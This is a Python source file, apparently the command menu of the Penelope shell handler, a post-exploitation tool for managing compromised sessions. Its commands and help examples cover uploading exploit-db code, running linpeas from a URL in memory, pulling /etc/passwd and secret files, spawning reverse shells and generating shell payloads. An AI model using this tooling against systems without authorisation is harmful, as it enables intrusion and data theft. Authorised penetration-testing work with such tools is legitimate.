import re
import os
import shlex
import threading
import signal
import sys
from collections import defaultdict
from textwrap import dedent, indent
from glob import glob
from argparse import ArgumentParser

from penelope_mod.context import ctx
from penelope_mod.ui import paint, Table
from penelope_mod.network import Interfaces
from penelope_mod.io import my_input as input, ask, stdout
from penelope_mod.plugins import discover
from penelope_mod.system import Open
from penelope_mod.core import TCPListener, Connect

# For backward compatibility
def modules():
    return discover()

class BetterCMD:
	def __init__(self, prompt=None, banner=None, histfile=None, histlen=None):
		self.prompt = prompt
		self.banner = banner
		self.histfile = histfile
		self.histlen = histlen
		self.cmdqueue = []
		self.lastcmd = ''
		self.active = threading.Event()
		self.stop = False

	def show(self):
		print()
		self.active.set()

	def start(self):
		self.preloop()
		if self.banner:
			print(self.banner)

		stop = None
		while not self.stop:
			try:
				try:
					self.active.wait()
					if self.cmdqueue:
						line = self.cmdqueue.pop(0)
					else:
						line = input(self.prompt, self.histfile, self.histlen, self.complete, " \t\n\"'><=;|&(:")

					signal.signal(signal.SIGINT, lambda num, stack: self.interrupt())
					line = self.precmd(line)
					stop = self.onecmd(line)
					stop = self.postcmd(stop, line)
					if stop:
						self.active.clear()
				except EOFError:
					stop = self.onecmd('EOF')
				except Exception:
					from penelope_mod.exceptions import custom_excepthook
					custom_excepthook(*__import__('sys').exc_info())
			except KeyboardInterrupt:
				print("^C")
				self.interrupt()
		self.postloop()

	def onecmd(self, line):
		cmd, arg, line = self.parseline(line)
		if cmd:
			try:
				func = getattr(self, 'do_' + cmd)
				self.lastcmd = line
			except AttributeError:
				return self.default(line)
			return func(arg)

	def default(self, line):
		ctx.cmdlogger.error("Invalid command")

	def interrupt(self):
		pass

	def parseline(self, line):
		line = line.lstrip()
		if not line:
			return None, None, line
		elif line[0] == '!':
			index = line[1:].strip()
			hist_len = ctx.readline.get_current_history_length() if ctx.readline else 0

			if not index.isnumeric() or not (0 < int(index) < hist_len):
				ctx.cmdlogger.error("Invalid command number")
				if ctx.readline:
					ctx.readline.remove_history_item(hist_len - 1)
				return None, None, line

			line = ctx.readline.get_history_item(int(index)) if ctx.readline else ''
			if ctx.readline:
				ctx.readline.replace_history_item(hist_len - 1, line)
			return self.parseline(line)

		else:
			parts = line.split(' ', 1)
			if len(parts) == 1:
				return parts[0], None, line
			elif len(parts) == 2:
				return parts[0], parts[1], line

	def precmd(self, line):
		return line

	def postcmd(self, stop, line):
		return stop

	def preloop(self):
		pass

	def postloop(self):
		pass

	def do_reset(self, line):
		"""
		Reset the local terminal
		"""
		if __import__('shutil').which("reset"):
			os.system("reset")
		else:
			ctx.cmdlogger.error("'reset' command doesn't exist on the system")

	def do_exit(self, line):
		"""
		Exit cmd
		"""
		self.stop = True
		self.active.clear()

	def do_quit(self, line):
		"""
		Exit cmd
		"""
		return self.do_exit(line)

	def do_q(self, line):
		"""
		Exit cmd
		"""
		return self.do_exit(line)

	def do_history(self, line):
		"""
		Show Main Menu history
		"""
		if ctx.readline:
			hist_len = ctx.readline.get_current_history_length()
			max_digits = len(str(hist_len))
			for i in range(1, hist_len + 1):
				print(f"  {i:>{max_digits}}  {ctx.readline.get_history_item(i)}")
		else:
			ctx.cmdlogger.error("Python is not compiled with readline support")

	def do_DEBUG(self, line):
		"""
		Open debug console
		"""
		import rlcompleter

		if ctx.readline:
			ctx.readline.clear_history()
			try:
				ctx.readline.read_history_file(ctx.options.debug_histfile)
			except Exception as e:
				ctx.cmdlogger.debug(f"Error loading history file: {e}")

		__import__('code').interact(banner=paint(
			"===> Entering debugging console...").CYAN, local=globals(),
			exitmsg=paint("<=== Leaving debugging console..."
		).CYAN)

		if ctx.readline:
			ctx.readline.set_history_length(ctx.options.histlength)
			try:
				ctx.readline.write_history_file(ctx.options.debug_histfile)
			except Exception as e:
				ctx.cmdlogger.debug(f"Error writing to history file: {e}")

	def completedefault(self, *ignored):
		return []

	def completenames(self, text, *ignored):
		dotext = 'do_' + text
		return [a[3:] for a in dir(self.__class__) if a.startswith(dotext)]

	def complete(self, text, state):
		if state == 0:
			origline = ctx.readline.get_line_buffer() if ctx.readline else ''
			line = origline.lstrip()
			stripped = len(origline) - len(line)
			begidx = (ctx.readline.get_begidx() - stripped) if ctx.readline else 0
			endidx = (ctx.readline.get_endidx() - stripped) if ctx.readline else 0
			if begidx > 0:
				cmd, args, foo = self.parseline(line)
				if cmd == '':
					compfunc = self.completedefault
				else:
					try:
						compfunc = getattr(self, 'complete_' + cmd)
					except AttributeError:
						compfunc = self.completedefault
			else:
				compfunc = self.completenames
			self.completion_matches = compfunc(text, line, begidx, endidx)
		try:
			return self.completion_matches[state]
		except IndexError:
			return None
	@staticmethod
	def file_completer(text):
		matches = glob(text + '*')
		matches = [m + '/' if os.path.isdir(m) else m for m in matches]
		return matches


class MainMenu(BetterCMD):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
			"Miscellaneous"     :['help', 'modules', 'history', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	@property
	def active_sessions(self):
		active_sessions = len(ctx.core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def get_core_id_completion(text, *extra, attr='sessions'):
		options = list(map(str, getattr(ctx.core, attr)))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	def set_id(self, ID):
		self.sid = ID
		session_part = (
				f"{paint('─(').cyan_DIM}{paint('Session').green} "
				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
		) if self.sid else ''
		self.prompt = (
				f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
				f"{session_part}{paint('>').cyan_DIM} "
		)

	def session_operation(current=False, extra=[]):
		def inner(func):
			from functools import wraps
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if ctx.core.sessions:
							ctx.cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
						else:
							ctx.cmdlogger.warning("No available sessions to perform this action")
						return False
				else:
					if ID:
						if ID.isnumeric() and int(ID) in ctx.core.sessions:
							ID = int(ID)
						elif ID not in extra:
							ctx.cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							ctx.cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def interrupt(self):
		if ctx.core.attached_session and not ctx.core.attached_session.type == 'Readline':
			ctx.core.attached_session.detach()
		else:
			if ctx.menu.sid and not ctx.core.sessions[ctx.menu.sid].agent: # TEMP
				ctx.core.sessions[ctx.menu.sid].control_session.subchannel.control << 'stop'

	def show_help(self, command):
		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
		parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = help_prompt.sub('', part)
			modified_parts.append(part)
		print(indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					ctx.cmdlogger.warning(
						f"No such command: '{command}'. "
						"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session_operation(extra=['none'])
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use 1		Select the SessionID 1
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		Show active sessions or interact with the SessionID

		Examples:

			sessions		Show active sessions
			sessions 1		Interact with SessionID 1
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if ctx.core.sessions:
				for host, sessions in ctx.core.hosts.items():
					if not sessions:
						continue
					print('\n➤  ' + sessions[0].name_colored)
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							if session.host_needs_control_session and session.control_session is session:
								ID = paint(' ' + str(session.id)).cyan
							else:
								ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = session.listener or f'Connect({session._host}:{session.port})'
						table += [
							ID,
							paint(session.type).CYAN if session.type == 'PTY' else session.type,
							session.user or 'N/A',
							source
						]
					print("\n", indent(str(table), "    "), "\n", sep="")
			else:
				print()
				ctx.cmdlogger.warning("No sessions yet 😟")
				print()

	@session_operation()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact 1	Interact with SessionID 1
		"""
		return ctx.core.sessions[ID].attach()

	@session_operation(extra=['*'])
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill 1		Kill SessionID 1
			kill *		Kill all sessions
		"""

		if ID == '*':
			if not ctx.core.sessions:
				ctx.cmdlogger.warning("No sessions to kill")
				return False
			else:
				if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
					if ctx.options.maintain > 1:
						ctx.options.maintain = 1
						self.onecmd("maintain")
					for session in reversed(list(ctx.core.sessions.copy().values())):
						session.kill()
		else:
			ctx.core.sessions[ID].kill()

		if ctx.options.single_session and len(ctx.core.sessions) == 1:
			ctx.core.stop()
			ctx.logger.info("Penelope exited due to Single Session mode")
			return True

	@session_operation(current=True)
	def do_portfwd(self, line):
		"""
		host:port(<-|->)host:port
		Local and Remote port forwarding

		Examples:

			-> 192.168.0.1:80		Forward 127.0.0.1:80 to 192.168.0.1:80
			0.0.0.0:8080 -> 192.168.0.1:80	Forward 0.0.0.0:8080 to 192.168.0.1:80
		"""
		if not line:
			ctx.cmdlogger.warning("No parameters...")
			return False

		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
		if match:
			group1 = match.group(1)
			arrow = match.group(2)
			group2 = match.group(3)
		else:
			ctx.cmdlogger.warning("Invalid syntax")
			return False

		if arrow == '->':
			_type = 'L'
			lhost = "127.0.0.1"

			if group2:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group2)
				if match:
					rhost = match.group(1)
					rport = match.group(2)
					lport = rport
				if not rport:
					ctx.cmdlogger.warning("At least remote port is required")
					return False
			else:
				ctx.cmdlogger.warning("At least remote port is required")
				return False

			if group1:
				match = re.search(r"((?:[^\s]*)?):((?:[^\s]*)?)", group1)
				if match:
					lhost = match.group(1)
					lport = match.group(2)
				else:
					ctx.cmdlogger.warning("Invalid syntax")
					return False

		elif arrow == '<-':
			_type = 'R'

			if group2:
				rhost, rport = group2.split(':')

			if group1:
				lhost, lport = group1.split(':')
			else:
				ctx.cmdlogger.warning("At least local port is required")
				return False

		ctx.core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))

	@session_operation(current=True)
	def do_download(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		if remote_items:
			ctx.core.sessions[self.sid].download(remote_items)
		else:
			ctx.cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_open(self, remote_items):
		"""
		<glob>...
		Download files / folders from the target and open them locally

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_items:
			items = ctx.core.sessions[self.sid].download(remote_items)

			if len(items) > ctx.options.max_open_files:
				ctx.cmdlogger.warning(
					f"More than {ctx.options.max_open_files} items selected"
					" for opening. The open list is truncated to "
					f"{ctx.options.max_open_files}."
				)
				items = items[:ctx.options.max_open_files]

			for item in items:
				Open(item)
		else:
			ctx.cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_upload(self, local_items):
		"""
		<glob|URL>...
		Upload files / folders / HTTP(S)/FTP(S) URLs to the target
		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
		when the target has no Internet access

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
		"""
		if local_items:
			ctx.core.sessions[self.sid].upload(local_items, randomize_fname=True)
		else:
			ctx.cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_script(self, local_item):
		"""
		<local_script|URL>
		In-memory local or URL script execution & real time downloaded output

		Examples:
			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if local_item:
			ctx.core.sessions[self.sid].script(local_item)
		else:
			ctx.cmdlogger.warning("No script to execute")

	@staticmethod
	def show_modules():
		categories = defaultdict(list)
		for module in modules().values():
			categories[module.category].append(module)

		print()
		for category in categories:
			print("  " + str(paint(category).BLUE))
			table = Table(joinchar=' │ ')
			for module in categories[category]:
				description = module.run.__doc__ or ""
				if description:
					description = module.run.__doc__.strip().splitlines()[0]
				table += [paint(module.__name__).red, description]
			print(indent(str(table), '  '), "\n", sep="")

	@session_operation(current=True)
	def do_run(self, line):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules"""
		try:
			parts = line.split(" ", 1)
			module_name = parts[0]
		except:
			module_name = None
			print()
			ctx.cmdlogger.warning(paint("Select a module").YELLOW_white)

		if module_name:
			module = modules().get(module_name)
			if module:
				args = parts[1] if len(parts) == 2 else ''
				module.run(ctx.core.sessions[self.sid], args)
			else:
				ctx.cmdlogger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session_operation(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn a new session.

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. On the other tab run: ./penelope.py 5555

			spawn 3333 10.10.10.10	Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				ctx.cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				ctx.cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		ctx.core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				ctx.options.maintain = num
				refreshed = False
				for host in ctx.core.hosts.values():
					if len(host) < num:
						refreshed = True
						host[0].maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				ctx.cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if ctx.options.maintain >= 2 else paint('Disabled').white_RED
			ctx.cmdlogger.info(f"Maintain value set to {paint(ctx.options.maintain).yellow} {status}")

	@session_operation(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		ctx.core.sessions[self.sid].upgrade()

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the session's local folder. If no session specified, open the base folder
		"""
		folder = ctx.core.sessions[self.sid].directory if self.sid else ctx.options.basedir
		Open(folder)
		print(folder)

	@session_operation(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a remote command

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			if ctx.core.sessions[self.sid].agent:
				ctx.core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					stdout_dst=sys.stdout.buffer,
					stderr_dst=sys.stderr.buffer
				)
			else:
				output = ctx.core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					value=True
				)
				print(output)
		else:
			ctx.cmdlogger.warning("No command to execute")

	'''@session_operation(current=True) # TODO
	def do_tasks(self, line):
		"""
		Show assigned tasks
		"""
		table = Table(joinchar=' | ')
		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

		for sessionid in ctx.core.sessions:
			tasks = ctx.core.sessions[sessionid].tasks
			for taskid in tasks:
				for stream in tasks[taskid]['streams'].values():
					if stream.closed:
						status = paint('Completed!').GREEN
						break
				else:
					status = paint('Active...').YELLOW

				table += [
					paint(sessionid).red,
					paint(taskid).cyan,
					paint(tasks[taskid]['pid']).blue,
					paint(tasks[taskid]['command']).yellow,
					paint(tasks[taskid]['streams']['1'].name).green,
					status
				]

		if len(table) > 1:
			print(table)
		else:
			ctx.logger.warning("No assigned tasks")'''

	def do_listeners(self, line):
		"""
		[<add|stop>[-i <iface>][-p <port>]]
		Add / stop / view Listeners

		Examples:

			listeners			Show active Listeners
			listeners add -i any -p 4444	Create a Listener on 0.0.0.0:4444
			listeners stop 1		Stop the Listener with ID 1
		"""
		if line:
			parser = ArgumentParser(prog="listeners")
			subparsers = parser.add_subparsers(dest="command", required=True)

			parser_add = subparsers.add_parser("add", help="Add a new listener")
			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
			parser_add.add_argument("-p", "--port", help="Port to listen on", default=ctx.options.default_listener_port)
			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')

			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
			parser_stop.add_argument("id", help="Listener ID to stop")

			try:
				args = parser.parse_args(line.split())
			except SystemExit:
				return False

			if args.command == "add":
				if args.type == 'tcp':
					TCPListener(args.interface, args.port)

			elif args.command == "stop":
				if args.id == '*':
					listeners = ctx.core.listeners.copy()
					if listeners:
						for listener in listeners.values():
							listener.stop()
					else:
						ctx.cmdlogger.warning("No listeners to stop...")
						return False
				else:
					try:
						ctx.core.listeners[int(args.id)].stop()
					except (KeyError, ValueError):
						ctx.logger.error("Invalid Listener ID")

		else:
			if ctx.core.listeners:
				table = Table(joinchar=' | ')
				table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
				for listener in ctx.core.listeners.values():
					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
				print('\n', indent(str(table), '  '), '\n', sep='')
			else:
				ctx.cmdlogger.warning("No active Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		if not line:
			ctx.cmdlogger.warning("No target specified")
			return False
		try:
			address, port = line.split(' ')

		except ValueError:
			ctx.cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not ctx.options.no_attach:
				return True

	def do_payloads(self, line):
		"""
		Create reverse shell payloads based on the active listeners
		"""
		if ctx.core.listeners:
			print()
			for listener in ctx.core.listeners.values():
				print(listener.payloads, end='\n\n')
		else:
			ctx.cmdlogger.warning("No Listeners to show payloads")

	def do_Interfaces(self, line):
		"""
		Show the local network interfaces
		"""
		print(Interfaces())

	def do_exit(self, line):
		"""
		Exit Penelope
		"""
		if ask(f"Exit Penelope?{self.active_sessions} (y/N): ").lower() == 'y':
			super().do_exit(line)
			ctx.core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			ctx.cmdlogger.info("Exited!")
			remaining_threads = [thread for thread in threading.enumerate()]
			if ctx.options.dev_mode and remaining_threads:
				ctx.cmdlogger.error(f"REMAINING THREADS: {remaining_threads}")
			return True
		return False

	def do_EOF(self, line):
		if self.sid:
			self.set_id(None)
			print()
		else:
			print("exit")
			return self.do_exit(line)

	def do_reload(self, line):
		"""
		Reload modules
		"""
		from penelope_mod.plugins import discover
		discover()
		ctx.cmdlogger.info("Modules reloaded")

	def do_SET(self, line):
		"""
		Show current options
		"""
		if ctx.options:
			print(ctx.options)
		else:
			ctx.cmdlogger.warning("Options not initialized yet")

	def do_modules(self, line):
		"""
		Show available modules
		"""
		self.show_modules()
		self.show_modules()